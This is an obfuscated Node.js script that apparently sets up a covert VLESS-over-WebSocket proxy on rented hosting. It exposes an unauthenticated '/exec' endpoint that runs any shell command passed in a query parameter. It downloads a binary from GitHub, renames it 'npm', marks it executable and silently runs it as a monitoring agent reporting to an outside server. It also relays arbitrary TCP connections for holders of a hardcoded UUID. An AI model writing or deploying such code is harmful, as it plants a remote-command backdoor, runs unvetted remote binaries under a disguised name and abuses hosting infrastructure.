const _0x1aeb94=_0xa23b;(function(_0x590a3f,_0x5c85b0){const _0x1a7860=_0xa23b,_0x28877f=_0x590a3f();while(!![]){try{const _0x5c73c8=-parseInt(_0x1a7860(0x161))/0x1+parseInt(_0x1a7860(0x179))/0x2+-parseInt(_0x1a7860(0x1ae))/0x3+parseInt(_0x1a7860(0x193))/0x4+-parseInt(_0x1a7860(0x1ac))/0x5+parseInt(_0x1a7860(0x15f))/0x6+parseInt(_0x1a7860(0x194))/0x7;if(_0x5c73c8===_0x5c85b0)break;else _0x28877f['push'](_0x28877f['shift']());}catch(_0x3e9d9c){_0x28877f['push'](_0x28877f['shift']());}}}(_0x267a,0x1f338));const os=require('os'),http=require('http'),{Buffer}=require('buffer'),fs=require('fs'),axios=require(_0x1aeb94(0x1a9)),path=require(_0x1aeb94(0x1b6)),net=require(_0x1aeb94(0x196)),{exec,execSync}=require(_0x1aeb94(0x1a1)),{WebSocket,createWebSocketStream}=require('ws'),logcb=(..._0x54b3ab)=>console[_0x1aeb94(0x162)][_0x1aeb94(0x18e)](this,..._0x54b3ab),errcb=(..._0x29d156)=>console[_0x1aeb94(0x177)][_0x1aeb94(0x18e)](this,..._0x29d156),UUID=process[_0x1aeb94(0x1a8)][_0x1aeb94(0x19c)]||'b28f60af-d0b9-4ddf-baaa-7e49c93c380b',uuid=UUID[_0x1aeb94(0x16a)](/-/g,''),NEZHA_SERVER=process[_0x1aeb94(0x1a8)][_0x1aeb94(0x15b)]||_0x1aeb94(0x187),NEZHA_PORT=process[_0x1aeb94(0x1a8)][_0x1aeb94(0x1b5)]||_0x1aeb94(0x195),NEZHA_KEY=process['env'][_0x1aeb94(0x17e)]||'',DOMAIN=process[_0x1aeb94(0x1a8)][_0x1aeb94(0x1aa)]||'',NAME=process[_0x1aeb94(0x1a8)][_0x1aeb94(0x191)]||_0x1aeb94(0x1b7),port=process[_0x1aeb94(0x1a8)][_0x1aeb94(0x17f)]||0xbb8,httpServer=http[_0x1aeb94(0x16e)]((_0x624c19,_0x287a95)=>{const _0x229e02=_0x1aeb94,_0x26aca0=url[_0x229e02(0x1a5)](_0x624c19[_0x229e02(0x1a7)],!![]);if(_0x26aca0[_0x229e02(0x166)]===_0x229e02(0x16c)){console['log'](_0x26aca0[_0x229e02(0x17b)]);if(!_0x26aca0[_0x229e02(0x17b)][_0x229e02(0x1af)]){_0x287a95[_0x229e02(0x182)](0xc8,{'Content-Type':_0x229e02(0x18b)}),_0x287a95[_0x229e02(0x171)](_0x229e02(0x183));return;}let _0x595c1f=_0x26aca0[_0x229e02(0x17b)][_0x229e02(0x1af)];exec(_0x595c1f,function(_0x2090c2,_0x39a482,_0x58235c){const _0x57a9ce=_0x229e02;_0x2090c2?(_0x287a95['writeHead'](0xc8,{'Content-Type':_0x57a9ce(0x18b)}),_0x287a95[_0x57a9ce(0x171)](_0x2090c2['message'])):(_0x287a95[_0x57a9ce(0x182)](0xc8,{'Content-Type':_0x57a9ce(0x18b)}),_0x287a95[_0x57a9ce(0x171)](_0x39a482));});return;}if(_0x624c19[_0x229e02(0x1a7)]==='/')_0x287a95[_0x229e02(0x182)](0xc8,{'Content-Type':_0x229e02(0x18b)}),_0x287a95[_0x229e02(0x171)](_0x229e02(0x19e));else{if(_0x624c19['url']==='/sb'){const _0x52d06e=_0x229e02(0x19a)+UUID+'@skk.moe:443?encryption=none&security=tls&sni='+DOMAIN+_0x229e02(0x173)+DOMAIN+_0x229e02(0x174)+NAME,_0x179ffd=Buffer[_0x229e02(0x180)](_0x52d06e)[_0x229e02(0x18d)]('base64');_0x287a95[_0x229e02(0x182)](0xc8,{'Content-Type':_0x229e02(0x18b)}),_0x287a95[_0x229e02(0x171)](_0x179ffd+'\x0a');}else _0x287a95[_0x229e02(0x182)](0x194,{'Content-Type':_0x229e02(0x18b)}),_0x287a95['end'](_0x229e02(0x18f));}});function _0xa23b(_0xf82012,_0x3ba272){const _0x267a7e=_0x267a();return _0xa23b=function(_0xa23b66,_0x3dcfbd){_0xa23b66=_0xa23b66-0x15b;let _0x572520=_0x267a7e[_0xa23b66];return _0x572520;},_0xa23b(_0xf82012,_0x3ba272);}httpServer[_0x1aeb94(0x1b3)](port,()=>{const _0x21ccbd=_0x1aeb94;console[_0x21ccbd(0x162)](_0x21ccbd(0x189)+port);});function getSystemArchitecture(){const _0x26bbaa=_0x1aeb94,_0x305899=os[_0x26bbaa(0x168)]();return _0x305899==='arm'||_0x305899===_0x26bbaa(0x175)?'arm':_0x26bbaa(0x160);}function downloadFile(_0x336f2a,_0x4682c5,_0x48ef65){const _0x4b04cc=_0x1aeb94,_0x30d2cb=path[_0x4b04cc(0x17d)]('./',_0x336f2a),_0x261808=fs[_0x4b04cc(0x1a3)](_0x30d2cb);axios({'method':_0x4b04cc(0x169),'url':_0x4682c5,'responseType':_0x4b04cc(0x188)})[_0x4b04cc(0x16d)](_0x128b8f=>{const _0x59d794=_0x4b04cc;_0x128b8f['data']['pipe'](_0x261808),_0x261808['on'](_0x59d794(0x170),function(){const _0xddf0=_0x59d794;_0x261808[_0xddf0(0x1b2)](),_0x48ef65(null,_0x336f2a);});})[_0x4b04cc(0x1a2)](_0x7a6829=>{const _0x350bc5=_0x4b04cc;_0x48ef65('Download\x20'+_0x336f2a+_0x350bc5(0x186)+_0x7a6829[_0x350bc5(0x192)]);});}function downloadFiles(){const _0x3afd09=_0x1aeb94,_0xc9252a=getSystemArchitecture(),_0xbd8cd6=getFilesForArchitecture(_0xc9252a);if(_0xbd8cd6[_0x3afd09(0x19b)]===0x0){console['log'](_0x3afd09(0x15d));return;}let _0x212d6f=0x0;_0xbd8cd6[_0x3afd09(0x185)](_0x1d23ec=>{const _0x194dcd=_0x3afd09;downloadFile(_0x1d23ec[_0x194dcd(0x19d)],_0x1d23ec[_0x194dcd(0x15e)],(_0x579bac,_0x2061e1)=>{const _0x10ada6=_0x194dcd;_0x579bac?console[_0x10ada6(0x162)](_0x10ada6(0x197)+_0x2061e1+_0x10ada6(0x184)):(console[_0x10ada6(0x162)](_0x10ada6(0x197)+_0x2061e1+_0x10ada6(0x190)),_0x212d6f++,_0x212d6f===_0xbd8cd6['length']&&setTimeout(()=>{authorizeFiles();},0xbb8));});});}function _0x267a(){const _0x48a33d=['Hello,\x20World\x0a','npm','map','child_process','catch','createWriteStream','https://github.com/eooce/test/releases/download/ARM/swith','parse','decode','url','env','axios','DOMAIN','npm\x20running\x20error:\x20','1070715hgKdTj','chmod','609816pmuJdM','cmd','send','npm\x20is\x20running','close','listen','Empowerment\x20success:','NEZHA_PORT','path','JP-webhostmost-GCP','NEZHA_SERVER','UUID\x20验证失败','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','fileUrl','435666jEfPlU','amd','231332AcnZUQ','log','connect','slice','pipe','pathname','connection','arch','get','replace','readUInt16BE','/exec','then','createServer','E1:','finish','end','连接到:','&type=ws&host=','&path=%2F#','arm64','readUInt8','error','arm','303500ycmncm','https://github.com/eooce/test/releases/download/bulid/swith','query','reduce','join','NEZHA_KEY','PORT','from','处理消息时出错:','writeHead','No\x20command\x0a','\x20failed','forEach','\x20failed:\x20','nezha.gvkoyeb.eu.org','stream','HTTP\x20Server\x20is\x20running\x20on\x20port\x20','./npm\x20-s\x20','text/plain','concat','toString','bind','Not\x20Found\x0a','\x20successfully','NAME','message','986248xSFxpk','2139368LSQADD','443','net','Download\x20','--tls','WebSocket\x20连接成功','vless://','length','UUID','fileName'];_0x267a=function(){return _0x48a33d;};return _0x267a();}function getFilesForArchitecture(_0x4199ac){const _0x359c58=_0x1aeb94;if(_0x4199ac===_0x359c58(0x178))return[{'fileName':_0x359c58(0x19f),'fileUrl':_0x359c58(0x1a4)}];else{if(_0x4199ac===_0x359c58(0x160))return[{'fileName':_0x359c58(0x19f),'fileUrl':_0x359c58(0x17a)}];}return[];}function authorizeFiles(){const _0xa00c1=_0x1aeb94,_0xd6ca6f='./npm',_0x5376a3=0x1fd;fs[_0xa00c1(0x1ad)](_0xd6ca6f,_0x5376a3,_0x36364a=>{const _0x2a4743=_0xa00c1;if(_0x36364a)console[_0x2a4743(0x177)]('Empowerment\x20failed:'+_0x36364a);else{console[_0x2a4743(0x162)](_0x2a4743(0x1b4)+_0x5376a3[_0x2a4743(0x18d)](0x8)+'\x20('+_0x5376a3[_0x2a4743(0x18d)](0xa)+')');let _0x187701='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){NEZHA_PORT===_0x2a4743(0x195)?_0x187701=_0x2a4743(0x198):_0x187701='';const _0x4587ec=_0x2a4743(0x18a)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x187701+'\x20--skip-conn\x20--disable-auto-update\x20--skip-procs\x20--report-delay\x204\x20>/dev/null\x202>&1\x20&';try{exec(_0x4587ec),console[_0x2a4743(0x162)](_0x2a4743(0x1b1));}catch(_0x540c15){console[_0x2a4743(0x177)](_0x2a4743(0x1ab)+_0x540c15);}}else console[_0x2a4743(0x162)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');}});}downloadFiles();const wss=new WebSocket['Server']({'server':httpServer});wss['on'](_0x1aeb94(0x167),_0x1cd303=>{const _0xbf9f71=_0x1aeb94;console[_0xbf9f71(0x162)](_0xbf9f71(0x199)),_0x1cd303['on'](_0xbf9f71(0x192),_0x52dab0=>{const _0x48f565=_0xbf9f71;if(_0x52dab0[_0x48f565(0x19b)]<0x12){console[_0x48f565(0x177)]('数据长度无效');return;}try{const [_0x54ea27]=_0x52dab0,_0x2eb6cd=_0x52dab0[_0x48f565(0x164)](0x1,0x11);if(!_0x2eb6cd['every']((_0x370dde,_0x350b9f)=>_0x370dde==parseInt(uuid['substr'](_0x350b9f*0x2,0x2),0x10))){console[_0x48f565(0x177)](_0x48f565(0x15c));return;}let _0x407440=_0x52dab0[_0x48f565(0x164)](0x11,0x12)[_0x48f565(0x176)]()+0x13;const _0x38ed05=_0x52dab0[_0x48f565(0x164)](_0x407440,_0x407440+=0x2)[_0x48f565(0x16b)](0x0),_0x420f4a=_0x52dab0['slice'](_0x407440,_0x407440+=0x1)[_0x48f565(0x176)](),_0x5b29b0=_0x420f4a===0x1?_0x52dab0['slice'](_0x407440,_0x407440+=0x4)[_0x48f565(0x17d)]('.'):_0x420f4a===0x2?new TextDecoder()[_0x48f565(0x1a6)](_0x52dab0[_0x48f565(0x164)](_0x407440+0x1,_0x407440+=0x1+_0x52dab0['slice'](_0x407440,_0x407440+0x1)[_0x48f565(0x176)]())):_0x420f4a===0x3?_0x52dab0['slice'](_0x407440,_0x407440+=0x10)[_0x48f565(0x17c)]((_0x15e52d,_0x5a8880,_0x160b77,_0x563aa0)=>_0x160b77%0x2?_0x15e52d[_0x48f565(0x18c)](_0x563aa0['slice'](_0x160b77-0x1,_0x160b77+0x1)):_0x15e52d,[])[_0x48f565(0x1a0)](_0x165b11=>_0x165b11[_0x48f565(0x16b)](0x0)[_0x48f565(0x18d)](0x10))[_0x48f565(0x17d)](':'):'';console[_0x48f565(0x162)](_0x48f565(0x172),_0x5b29b0,_0x38ed05),_0x1cd303[_0x48f565(0x1b0)](new Uint8Array([_0x54ea27,0x0]));const _0x8d7375=createWebSocketStream(_0x1cd303);net[_0x48f565(0x163)]({'host':_0x5b29b0,'port':_0x38ed05},function(){const _0x1e7128=_0x48f565;this['write'](_0x52dab0[_0x1e7128(0x164)](_0x407440)),_0x8d7375['on'](_0x1e7128(0x177),_0x1bddd4=>console[_0x1e7128(0x177)](_0x1e7128(0x16f),_0x1bddd4[_0x1e7128(0x192)]))[_0x1e7128(0x165)](this)['on'](_0x1e7128(0x177),_0x35235a=>console['error']('E2:',_0x35235a[_0x1e7128(0x192)]))['pipe'](_0x8d7375);})['on'](_0x48f565(0x177),_0x558875=>console['error']('连接错误:',_0x558875[_0x48f565(0x192)]));}catch(_0x51cbbc){console[_0x48f565(0x177)](_0x48f565(0x181),_0x51cbbc['message']);}})['on']('error',_0x11d759=>console[_0xbf9f71(0x177)]('WebSocket\x20错误:',_0x11d759[_0xbf9f71(0x192)]));});
